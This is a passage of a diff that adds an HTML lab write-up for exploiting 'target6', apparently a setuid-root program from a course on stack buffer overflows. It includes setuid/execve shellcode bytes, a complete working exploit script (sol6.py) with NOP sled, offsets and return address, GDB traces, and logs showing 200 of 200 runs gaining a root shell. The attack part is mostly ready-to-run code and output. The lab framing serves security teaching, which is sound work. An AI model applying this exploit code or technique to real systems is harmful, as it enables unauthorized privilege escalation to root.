+<span class="g">EIP = 0xfff6b7c8</span>             <span class="c"># fixed return address landed in the sled</span>
+<span class="g">ESP = 0xfff6b960</span>             <span class="c"># ESP advanced by 4 because ret popped the return address</span>
+bytes at EIP:
+0xfff6b7c8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b7d0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xfff6b7d8: 0x90 0x90 0x90 0x90
+next instruction:
+<span class="g">=&gt; 0xfff6b7c8: nop</span>
+
+Continuing through the NOP sled into the shellcode...
+(Deleting breakpoints first: after execve, the old target6 addresses are gone.)
+<span class="r">process 3784 is executing new program: /usr/bin/dash</span>
+<span class="c"># This is execve("/bin/sh") succeeding. The old target6 process is replaced.</span></pre>
+
+    <p class="small">
+      Full GDB trace: <a href="gdb_target6_payload.txt">gdb_target6_payload.txt</a> ·
+      vulnerability disassembly: <a href="gdb_target6_vulnerable.txt">gdb_target6_vulnerable.txt</a> ·
+      stack memory map: <a href="gdb_target6_maps.txt">gdb_target6_maps.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="shellcode">
+    <h2><span class="num">7</span>Using shellcode.py in sol6.py</h2>
+    <p class="section-intro">
+      Yes — sol6.py now imports the provided <code>shellcode</code> object directly.
+      The fallback bytes are only there so the file still works if it is copied away from
+      the target directory.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">shellcode.py from the lab</h3>
+        <pre style="margin-bottom:0">setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
+bin_sh = (
+    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b'
+    b'\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80'
+    b'\xe8\xdc\xff\xff\xff/bin/sh')
+
+shellcode = setuid + bin_sh</pre>
+        <p class="small" style="margin-bottom:0">
+          8 bytes call <code>setuid(0)</code>, then 45 bytes set up and call
+          <code>execve("/bin/sh", ...)</code>. Total length: 53 bytes.
+        </p>
+      </div>
+
+      <div class="card">
+        <h3 style="margin-top:0">Why this shellcode is useful here</h3>
+        <ul>
+          <li>It is position-independent: it finds the <code>/bin/sh</code> string via a <code>call</code>/<code>pop</code> trick.</li>
+          <li>It has no NUL bytes, so <code>strcpy()</code> copies all of it.</li>
+          <li><code>setuid(0)</code> runs first, and target6 is setuid-root.</li>
+          <li><code>execve</code> replaces the process, so execution never returns to the helper's canary check.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="file-label">sol6.py — final version</div>
+    <pre>import sys
+
+<span class="c"># Use the shellcode supplied with the lab.</span>
+try:
+    <span class="g">from shellcode import shellcode</span>
+except ImportError:
+    shellcode = bytes.fromhex(
+        "31db8d431799cd80"
+        "eb1f5e89760831c088460789460cb00b89f38d4e088d560ccd80"
+        "31db89d840cd80"
+        "e8dcffffff2f62696e2f7368"
+    )
+
+<span class="c"># vulnerable() layout from objdump:</span>
+<span class="c">#   lea edx,[ebp-0x408]  -> buf = EBP - 1032</span>
+<span class="c">#   saved EBP at offset 1032</span>
+<span class="c">#   saved EIP at offset 1036</span>
+
+NOP = b"\x90"
+SHELLCODE_OFFSET = 900
+RET_OFFSET = 1036
+RET_ADDR = 0xFFF6B7C8
+
+payload = bytearray(NOP * SHELLCODE_OFFSET)
+payload += shellcode
+payload += NOP * (RET_OFFSET - len(payload))
+payload += RET_ADDR.to_bytes(4, "little")
+
+sys.stdout.buffer.write(payload)</pre>
+
+    <div class="callout info">
+      <strong>Payload size</strong>
+      <code>python3 sol6.py | wc -c</code> prints <code>1040</code>: 1036 bytes to reach
+      the saved EIP slot, plus the four-byte return address.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="test">
+    <h2><span class="num">8</span>Final test: 200 / 200 root</h2>
+    <p class="section-intro">
+      The final check ran the real setuid-root target 200 times, feeding
+      <code>id</code> and <code>exit</code> to each shell. Every run returned root.
+    </p>
+
+    <div class="file-label">target6_test.txt</div>
+    <pre>sol6.py test with the real setuid-root target6
+command: ./target6 "$(python3 sol6.py)"
+input: id; exit
+
+ok=200 fail=0</pre>
+
+    <div class="file-label">Example of one successful root shell</div>
+    <pre>$ printf 'id\nwhoami\nexit\n' | ./target6 "$(python3 sol6.py)"
+uid=0(root) gid=1002(student) groups=1002(student),24(cdrom),...
+root</pre>
+
+    <div class="callout success">
+      <strong>No output before the shell</strong>
+      The target prints nothing before the shell starts. The only output above comes from
+      the <code>id</code> and <code>whoami</code> commands that were typed into the root
+      shell.
+    </div>
+
+    <p class="small">
+      Full test log: <a href="target6_test.txt">target6_test.txt</a> ·
+      solution: <a href="sol6.py">sol6.py</a> ·
+      shellcode source: <a href="shellcode.py">shellcode.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="reproduce">
+    <h2><span class="num">9</span>Reproduce the investigation</h2>
+    <p class="section-intro">
+      These are the commands used to inspect the binary, measure the random buffer address,
+      and trace the working payload.
+    </p>
+
+    <div class="file-label">Inspect the binary</div>
+    <pre>cd ~/targets
+objdump -d -Mintel --disassemble=vulnerable target6
+readelf -W -l target6 | grep -E 'GNU_STACK|LOAD'
+nm -n target6 | grep -E ' vulnerable$'
+
+<span class="c"># Read the patched STACK_GOAL constant from the binary.</span>
+python3 - &lt;&lt;'PY'
+import struct
+with open('target6','rb') as f:
+    f.seek(7465)
+    b=f.read(4)
+print(b.hex(), hex(struct.unpack('=I',b)[0]))
+PY</pre>
+
+    <div class="file-label">Measure BUF across many runs</div>
+    <pre><span class="c"># findbuf.gdb</span>
+set pagination off
+break *0x0804a06b
+commands
+  silent
+  printf "EBP=%p ESP=%p BUF=%p\n", $ebp, $esp, $ebp-0x408
+  quit
+end
+run
+
+<span class="c"># run it 100 times</span>
+for i in $(seq 1 100); do
+  gdb -q -batch -x /tmp/findbuf.gdb --args ./target6 AAAA
+done | sort | uniq -c</pre>
+
+    <div class="file-label">Trace the real payload</div>
+    <pre>gdb -q \
+  -x /tmp/target6_payload.gdb \
+  --args ./target6 "$(python3 sol6.py)"</pre>
+
+    <h3>Useful GDB commands for this target</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Command</th><th>Why use it here</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">break *0x0804a06b</td><td>Stop just before <code>strcpy</code>, after the vulnerable prologue.</td></tr>
+          <tr><td class="mono">p/x $ebp</td><td>Read the frame base; this is what shifts with MINIASLR.</td></tr>
+          <tr><td class="mono">p/x $ebp-0x408</td><td>Print the address of <code>buf</code>.</td></tr>
+          <tr><td class="mono">p/x $ebp+4</td><td>Print the saved EIP slot.</td></tr>
+          <tr><td class="mono">x/32bx $ebp-0x408</td><td>See the payload bytes, including the 0x90 NOP sled.</td></tr>
+          <tr><td class="mono">x/12wx $ebp-0x10</td><td>See the end of the buffer, saved EBP, and overwritten saved EIP.</td></tr>
+          <tr><td class="mono">x/8bx $ebp+4</td><td>Confirm the little-endian return address <code>c8 b7 f6 ff</code>.</td></tr>
+          <tr><td class="mono">x/4wx $esp</td><td>At <code>ret</code>, confirm ESP points at <code>0xfff6b7c8</code>.</td></tr>
+          <tr><td class="mono">x/16bx *(unsigned int*)$esp</td><td>Confirm the target address contains 0x90 NOPs.</td></tr>
+          <tr><td class="mono">stepi</td><td>Execute <code>ret</code> without placing a breakpoint on the stack address.</td></tr>
+          <tr><td class="mono">x/i $eip</td><td>Confirm the next instruction is <code>nop</code> after landing in the sled.</td></tr>
+          <tr><td class="mono">delete</td><td>Remove target6 breakpoints before <code>execve</code> replaces the process.</td></tr>
+          <tr><td class="mono">continue</td><td>Run through the sled and shellcode into <code>/bin/sh</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <footer>
+    <p>
+      Evidence files:
+      <a href="gdb_target6_payload.txt">gdb_target6_payload.txt</a> ·
+      <a href="gdb_target6_bufsamples.txt">gdb_target6_bufsamples.txt</a> ·
+      <a href="gdb_target6_bufsummary.txt">gdb_target6_bufsummary.txt</a> ·
+      <a href="gdb_target6_maps.txt">gdb_target6_maps.txt</a> ·
+      <a href="gdb_target6_info.txt">gdb_target6_info.txt</a> ·
+      <a href="gdb_target6_vulnerable.txt">gdb_target6_vulnerable.txt</a> ·
+      <a href="target6_test.txt">target6_test.txt</a>.
+    </p>
+    <p>
+      Source files: <a href="target6.c">target6.c</a> ·
+      <a href="helper.c">helper.c</a> ·
+      <a href="build.py">build.py</a> ·
+      <a href="shellcode.py">shellcode.py</a> ·
+      <a href="sol6.py">sol6.py</a>.
+    </p>
+  </footer>
+</main>
+
+<script>
+(function () {
+  const RET = 0xfff6b7c8;
+  const BASE = 0xfff6b630;
+  const r = document.getElementById('rval');
+  const rshow = document.getElementById('rshow');
+  const bufshow = document.getElementById('bufshow');
+  const offshow = document.getElementById('offshow');
+  const landshow = document.getElementById('landshow');
+  const marker = document.getElementById('marker');
+
+  function update() {
+    const value = Number(r.value);
+    const buf = BASE - value;
+    const off = RET - buf;
+    rshow.textContent = value;
+    bufshow.textContent = '0x' + (buf >>> 0).toString(16).padStart(8, '0');
+    offshow.textContent = off;
+    landshow.textContent = off < 900 ? 'NOP sled' : (off < 953 ? 'shellcode' : 'outside sled');
+    marker.style.left = (off / 1040 * 100).toFixed(3) + '%';
+  }
+  r.addEventListener('input', update);
+  update();
+})();
+</script>
+<script src="../stack-anim.js"></script>
+</body>
+</html>
